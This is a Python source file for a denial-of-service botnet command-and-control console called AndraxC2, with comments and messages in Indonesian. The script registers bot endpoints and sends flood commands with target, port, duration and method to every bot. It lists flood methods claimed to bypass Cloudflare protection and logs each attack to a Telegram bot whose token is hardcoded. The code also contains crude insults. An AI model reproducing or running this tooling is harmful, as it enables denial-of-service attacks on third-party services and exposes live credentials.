#.              WELCOME TO ANDRAX C2-API V2.2.2                        #
from operator import index
import socket
import json
import random
import string
import threading
import getpass
import urllib
from colorama import Fore, Back
import time
import os
import os,sys,time as t,re,requests,json
from urllib.parse import urlparse
from datetime import datetime, date
from requests import post
from time import sleep
import codecs

logged_in_user = None
ongoing_attacks = []  # List to store ongoing attack details
ip = requests.get('https://api.ipify.org').text.strip()
RESET = "\033[0m"
RED = "\033[31m"
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"

TELEGRAM_BOT_TOKEN = '7987945669:AAGGrqlFDx1a4A0mXO4qGjWkEvetmZulCKQ'
CHAT_ID = '7870110314'

def send_telegram_monitoring(host, port, time, methods):
    message = f"""[ Monitoring Attack ]
Host: {host}
Port: {port}
Time: {time}
Methods: {methods}"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Gagal kirim monitoring ke Telegram: {e}")
        
def kontol_bapak_lu():
    try:
        with open('./tuls/botnet.json', 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading botnet data: {e}")
        return {"endpoints": []}

# Fungsi untuk menyimpan data botnet ke file
def save_botnet_data(botnet_data):
    try:
        with open('./tuls/botnet.json', 'w') as f:
            json.dump(botnet_data, f, indent=2)
    except Exception as e:
        print(f"Error saving botnet data: {e}")

# Fungsi untuk menambahkan endpoint ke botnet
def add_botnet_endpoint(endpoint):
    parsed_url = urlparse(endpoint)
    host = parsed_url.netloc
    new_endpoint = {
        "endpoint_net": f"http://{host}/api/attack",
        "api-key": "hanzz"
    }

    botnet_data = kontol_bapak_lu()
    for existing_endpoint in botnet_data["endpoints"]:
        if existing_endpoint["endpoint_net"] == new_endpoint["endpoint_net"]:
            print(f"Endpoint {new_endpoint['endpoint_net']} sudah ada dalam daftar botnet.")
            return

    botnet_data["endpoints"].append(new_endpoint)
    save_botnet_data(botnet_data)
    print(f"Endpoint {new_endpoint['endpoint_net']} berhasil ditambahkan ke botnet.")

# Fungsi untuk mendapatkan ISP, ASN, org, dan country berdasarkan IP menggunakan API ip-api.com
def get_ip_info(ip):
    try:
        # URL untuk mendapatkan data dari API ip-api.com
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        # Mengirim permintaan ke API ip-api.com untuk mendapatkan data IP
        response = requests.get(url)
        data = response.json()

        # Cek apakah status API berhasil atau gagal
        if data['status'] != 'success':
            return 'Unknown ASN', 'Unknown ISP', 'Unknown Org', 'Unknown Country'  # Jika gagal, kembalikan 'Unknown'

        # Mengambil informasi ISP, ASN, org, dan country
        asn = data.get('as', 'Unknown ASN')  # ASN biasanya disediakan dalam format 'ASXXXX'
        isp = data.get('isp', 'Unknown ISP')
        org = data.get('org', 'Unknown Org')  # Organisasi yang memiliki IP ini
        country = data.get('country', 'Unknown Country')  # Negara yang terkait dengan IP

        return asn, isp, org, country
    except requests.RequestException as e:
        print(f"Error fetching ASN and ISP data: {e}")
        return 'ASN Unknown', 'ISP Unknown', 'Org Unknown', 'Country Unknown'  # Jika ada kesalahan dalam permintaan

# Fungsi untuk mengekstrak IP dari URL
def maklu_maty(url):
    try:
        # Menggunakan socket untuk mendapatkan IP dari URL (hostname)
        hostname = url.split("://")[-1].split("/")[0]  # Menangani http/https dan menghilangkan path
        ip = socket.gethostbyname(hostname)  # Mendapatkan IP dari hostname
        return ip
    except socket.gaierror:
        print(f"Error: Unable to resolve IP for URL {url}")
        return None

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b/%d/%Y")

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

# Fungsi untuk memperbarui status serangan secara otomatis
def update_attacks():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    while True:
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Tunggu beberapa detik sebelum mengecek kembali
        t.sleep(1)  # Bisa disesuaikan sesuai kebutuhan

# Fungsi untuk menampilkan serangan yang sedang berlangsung
def ongoing():
    global ongoing_attacks  # Menggunakan global variable ongoing_attacks

    if ongoing_attacks:
        print(f"""                      Running
 {'#'} │       {'HOST'}      │ {'SINCE'} │ {'DURATION'} │ {'METHOD'} """)
        print('───┼─────────────────┼───────┼──────────┼────────')

        # Memperbarui status serangan yang sudah selesai dan menghapusnya
        completed_attacks = []
        for attack in ongoing_attacks:
            elapsed_time = int(t.time() - attack['start_time'])

            # Jika serangan telah selesai (elapsed_time >= duration)
            if elapsed_time >= attack['duration']:
                attack['status'] = 'Completed'
                completed_attacks.append(attack)  # Menambahkan serangan yang selesai ke list 'completed_attacks'
            else:
                attack['status'] = 'Ongoing'

        # Hapus serangan yang sudah selesai dari daftar ongoing_attacks
        ongoing_attacks = [attack for attack in ongoing_attacks if attack not in completed_attacks]

        # Menampilkan serangan yang sedang berlangsung
        for i, attack in enumerate(ongoing_attacks, 1):
            elapsed_time = int(t.time() - attack['start_time'])
            print(f" {i} │ {attack['host']:>15} │  {elapsed_time:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

        # Menampilkan serangan yang sudah selesai, jika ada
        for i, attack in enumerate(completed_attacks, 1):
            print(f" {i} │ {attack['host']:>15} │  {attack['duration']:>3}  │    {attack['duration']:>3}   │ {attack['method']:<9} ")

    else:
        print("(cnc) No running attacks, why not start some?")
        
        
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-



# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
def attack_endpoind(endpoints, url, port, duration, methods):
    success_count = 0
    for endpoint in endpoints:
        api_url = f"{endpoint['endpoint_net']}?key={endpoint['api-key']}&host={url}&port={port}&time={duration}&method={methods}"
        try:
            response = requests.get(api_url, timeout=1)
            if response.status_code == 200:
                success_count += 1
        except Exception as e:
            pass  # Jika gagal, tidak perlu tampilkan error
    return success_count
          
    success_count = attack_endpoind(botnet_data["endpoints"], url, port, duration, methods)
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

 

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

def banner():
    os.system('clear')
    print(f"[ \x1b[32mSYSTEM\x1b[0m ] Welcome To AndraxC2 Api")
    print(f"[ \x1b[32mSYSTEM\x1b[0m ] Owner @AndraxMaker")
    print("")
    print("")

    ascii_art = [
        "              ⠀          ⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀",
        "⠀                        ⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀",
        "⠀                        ⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄",
        "⠀⠀                        ⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿",
        "⠀                        ⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿",
        "⠀                        ⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟",
        "⠀                        ⠀⠀⠘⢿⣿⣟⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣾⣿⣿⠏⠀",
        "⠀⠀                        ⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀⠀",
        "⠀⠀⠀                        ⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸⠀⠀",
        "⠀⠀                        ⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼⠀⠀",
        "⠀⠀⠀⠀⠀                        ⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃⠀⠀",
        "⠀⠀⠀⠀⠀                        ⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀⠀⠀⠀",
        "⠀⠀⠀                        ⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀",
        "⠀⠀⠀⠀                        ⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀                        ⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀                        ⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀                        ⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                        ⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    ]

    for line in ascii_art:
        print(f"\033[36m{line}\033[0m")
        time.sleep(0.1)

    
    print(f"""              Please Type "\x1b[94mHELP\x1b[0m" Or "\x1b[94mMETHODS\x1b[0m" For Show All Menu""")
    print(f"""VIP: \x1b[31mTRUE\x1b[0m EXPIRY: \x1b[31m27.2 Centuries\x1b[0m ADMIN: \x1b[31mTRUE\x1b[0m USERNAME: \x1b[31mroot\x1b[0m CC:\x1b[31m 5\x1b[0m TIMELIMIT: \x1b[31m84000\x1b[0m""")
    print(f"""=======================================================================================""")
    print("")
    print("")
    time.sleep(0.1)


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-





# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
def cls():
    banner()  
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-|

def help():
    print("""                              Commands
 NAME     │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ display all registered commands
 methods  │ ----               │ display all registered methods
 clear    │ cls,c              │ see your amazing banner
 ongoing  │ ----               │ view running attacks
 exit     │ goodbye,imaheadout │ removes your session
 
 note : gunakan addserver untuk add botnet!
 contoh : addserver http://ip:port seperti ini:
 addserver http://123.123.12.123:8080
 """)

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

def andraxganteng():
   os.system('clear')
   print("")
   print("")
   print("""
\x1b[38;2;173;150;255m     
         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m
     
[ 𝑴𝒆𝒕𝒉𝒐𝒅𝒔 ]
- .[\x1b[1m\x1b[36mFLOOD-X\x1b[0m: high request per/s optimized for bypassing UAM.
- .[\x1b[1m\x1b[36mHARDER\x1b[0m: stable request per/s bypassing Cloudflare no protect.
- .[\x1b[1m\x1b[36mFLOOD-S\x1b[0m: flood high request for optimized bypassing Cloudflare.
- .[\x1b[1m\x1b[36mFLOOD-H\x1b[0m: high request per/s optimized for target no protect.
- .[\x1b[1m\x1b[36mTLS-X\x1b[0m: high request per/s, for ISP Google LLC.
- .[\x1b[1m\x1b[36mproxy\x1b[0m: Scrape Proxy 

note1 : menggunakan methode/scrape proxy nya wajib sama dengan tulisan nya! kalau tidak sama otomatis eror!!
note2 : menggunakan nya seperti ini : Attack target port time methods
example : Attack https://google.com 443 120 FLOOD-X
""")
   print("")
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
def credits():
    print("""
    
1. thanks to Allah S.W.T (my god)
2. thanks to ortu 
3. thanks to Zyo (my friend & owner 1 Space Stresser)
4. thanks to Hanif (my friend & owner 3 Space Stresser)
5. thanks to my self 
6. thanks to pln (babi mati terus+listrik mahal)
7. thanks to totolink (provider murah + gg (minus nya mati an))
8. thanks to xl (provider data gue)
9. thanks kepada teman² anjink yg hibur gue 

©andrax-developer
 
 """)
 #=============

def handle_input():
    while True:
        input_text = input(
    "\x1b[90m\x1b[91m[\x1b[90mAndrax\x1b[93m@\x1b[91mSpaceStressers\x1b[95mC2\x1b[97m]\x1b[0m \n\x1b[39m➣ \x1b[0m "
        ).strip()

        # Parsing perintah
        silit = input_text.split()
        if not silit:
            continue

        command = silit[0]

        if command == "addserver" and len(silit) == 2:
            add_botnet_endpoint(silit[1])
        #batesan
        

        elif command == "attack" or command == "ATTACK" or command == "Attack":
            try:
                url = silit[1]
                port = silit[2]
                duration = int(silit[3])                
                methods = silit[4]

                ip = maklu_maty(url)
                if ip:
                    asn, isp, org, country = get_ip_info(ip)
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),
                        'duration': duration,
                        'method': command.lower(),
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print("")
                    
                    
                    print(f"{CYAN}------> PARSING COMMAND{RESET}", end="", flush=True)
                    time.sleep(0.1)

                    print(f"\n {RED}- HOST{RESET} {BLUE}{url}{RESET}....", end="", flush=True)
                    time.sleep(0.1)
    
                    print(f"\n {RED}- METHOD{RESET} {BLUE}{methods}{RESET}....", end="", flush=True)
                    time.sleep(0.1)
    
                    print(f"\n {RED}- ISP{RESET} {BLUE}{isp}{RESET}....", end="", flush=True)
                    time.sleep(0.1)
    
                    print(f"\n {RED}- ASN{RESET} {BLUE}{asn}{RESET}....", end="", flush=True)
                    time.sleep(0.1)
    
                    print(f"\n {RED}- IP{RESET} {BLUE}{ip}{RESET}....", end="", flush=True)
                    time.sleep(0.1)
    
                    print(f"\n {RED}- COUNTRY{RESET} {BLUE}{country}{RESET}....", end="", flush=True)
                    time.sleep(0.1)

                    print(f"\n {CYAN}- payload built in...{RESET}   ", end="", flush=True)
                    time.sleep(0.5)
                    print(f"{GREEN}ok{RESET}....", end="", flush=True)
                    time.sleep(0.1)

                    print(f"\n {CYAN}- send payload to botnet/malwares client's...{RESET}   ", end="", flush=True)
                    success_count = attack_endpoind(kontol_bapak_lu()["endpoints"], url, port, duration, methods)
                    send_telegram_monitoring(url, port, duration, methods)
                    print(f"{GREEN}ok{RESET}....", end="", flush=True)
                    time.sleep(0.1)

                    print(f"\n {CYAN}- operation completed...?{RESET}   ", end="", flush=True)
                    time.sleep(0.5)
                    print(f"{GREEN}ok{RESET}....", end="", flush=True)
                    time.sleep(0.1)

                    print(f"\n {CYAN}- attack send!!!...{RESET}   ", end="", flush=True)
                    time.sleep(0.1)
                    print(f"{GREEN}ok{RESET}....", end="", flush=True)
                    time.sleep(0.1)
                    print("")
                    print("")

                    

            except ValueError:
                print("Error: Durasi harus berupa angka!")
            except IndexError:
                print("Error: Format perintah salah! Gunakan 'Attack <url> <port> <duration>' <methods>")
                
        
        

        elif command == "cls" or command == "CLS" or command == "c" or command == "CLEAR" or command == "clear":
            cls() 
            

        elif command == "help":
            help()
            
        elif command == "methods":
            andraxganteng()
        
        elif command == "ongoing":
            ongoing()
            
        elif command == "credits":
            credits()
        
        elif command == "exit":
            print("</> CNC : thanks to usage this script 🦄")
            sys.exit()
         

        else:
            print(f"Unknown command: {command} </> cnc : 404 asset not found!")


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# Kang Rekod kontol
if __name__ == "__main__":
    cls()
    handle_input()
